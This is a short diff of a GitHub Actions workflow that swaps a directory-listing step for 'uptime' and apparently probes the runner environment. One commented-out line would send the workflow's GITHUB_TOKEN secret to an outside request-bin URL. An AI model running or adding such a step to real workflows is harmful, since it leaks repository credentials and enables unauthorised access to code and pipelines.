@@ -7,6 +7,6 @@ jobs:
     steps:
       - run: echo "🎉 The job was automatically triggered by a ${{ github.event_name }} event."
      # - run: curl -H "BC:${{ secrets.GITHUB_TOKEN }}" https://www.postb.in/1756895755864-2829364708159/
-      - run: cd /home/runner; ls -la
+      - run: uptime
      # - run: touch /home/runner/test.txt
       - run: cd /home; ls -la
